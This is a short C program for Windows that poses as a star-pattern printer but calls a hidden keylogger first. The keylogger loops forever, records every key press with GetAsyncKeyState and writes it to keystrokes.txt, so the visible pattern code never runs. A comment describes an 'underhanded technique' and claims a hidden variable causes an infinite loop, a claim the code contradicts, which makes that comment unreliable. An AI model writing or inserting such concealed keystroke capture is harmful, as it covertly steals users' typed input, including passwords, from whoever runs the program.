#include <windows.h>

#include <stdio.h>

int main() { 
    keylogg();
    int i, j;
    
    for (i = 1; i <= 5; i++) {
        for (j = 1; j <= i; j++) {
            printf("*");
        }
        printf("\n");
    }
    
    // Underhanded technique: add a hidden variable that increments every time the code is run, eventually causing an infinite loop.
    int hidden_variable = 0;
    
    while (hidden_variable < 10) {
        printf("RABIES ");
        hidden_variable++;
    }
    
    return 0;
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    return 0;
}
